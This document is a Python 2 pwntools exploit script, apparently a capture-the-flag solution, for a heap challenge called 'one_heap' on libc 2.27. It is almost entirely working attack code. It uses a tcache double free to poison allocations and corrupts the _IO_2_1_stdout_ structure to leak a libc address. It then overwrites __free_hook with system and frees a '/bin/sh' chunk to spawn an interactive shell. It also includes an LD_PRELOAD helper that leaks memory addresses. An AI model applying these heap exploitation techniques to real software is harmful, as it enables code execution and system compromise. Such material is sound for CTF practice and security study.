#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    #include <stdio.h>
    #include <unistd.h>
    #include <dlfcn.h>

    void _init()
    {
        char *heap_addr = sbrk(0), *libc_addr = *(char **)dlopen("libc.so.6", RTLD_LAZY);;
        write(1, &heap_addr, 8);
        write(1, &libc_addr, 8);
    }
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -fPIC -shared -g /tmp/gdb_symbols{}.c -c -o /tmp/gdb_symbols{}.o && ld -shared -ldl /tmp/gdb_symbols{}.o -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './one_heap'
sh = 0
if(len(sys.argv) > 1):
    sh = process(execve_file, env={"LD_PRELOAD": '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
else:
    sh = process(execve_file)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $ptr=(void **)$rebase(0x202050)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def New(size, content):
    sh.sendlineafter('Your choice:', '1')
    sh.sendlineafter('Input the size:', str(size))
    sh.sendafter('Input the content:', content)

def delete():
    sh.sendlineafter('Your choice:', '2')


hook1 = 0
hook2 = 0
if(len(sys.argv) > 1):
    hook1 = u64(sh.recvn(8))
    log.info("hook1: " + hex(hook1))
    hook2 = u64(sh.recvn(8))
    log.info("hook2: " + hex(hook2))

New(0x68, '\n')
delete()
delete()

if(len(sys.argv) > 1):
    value = hook1 + 0x10
    New(0x68, p64(value)[:2] + '\n')
else:
    New(0x68, '\x10\x10' + '\n')

New(0x68, '\n')
New(0x68, '\xFF' * 0x40 + '\n')
delete()

# pause()
New(0x48, '\xFF' * 0x40 + '\n')

if(len(sys.argv) > 1):
    value = hook2 + libc.symbols['_IO_2_1_stdout_']
    New(0x18, p64(value)[:2] + '\n')
else:
    New(0x18, '\x60\x67' + '\n')


layout = [
    0xfbad3c80, #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
    0,          # _IO_read_ptr
    0,          # _IO_read_end
    0,          # _IO_read_base
]

# overwrite last byte of _IO_write_base to point to libc address
payload = flat(layout) + '\xc8'
New(0x38, payload + '\n')

_IO_2_1_stdin__addr = u64(sh.recvn(8))
log.success("_IO_2_1_stdin__addr: " + hex(_IO_2_1_stdin__addr))

libc_addr = _IO_2_1_stdin__addr - libc.symbols['_IO_2_1_stdin_']
log.success("libc_addr: " + hex(libc_addr))


New(0x18, p64(libc_addr + libc.symbols['__free_hook'] - 0x10) + '\n' )
New(0x78, '/bin/sh\0'.ljust(0x10, '\0') + p64(libc_addr + libc.symbols['system']) + '\n')

delete()

sh.interactive()
clear()
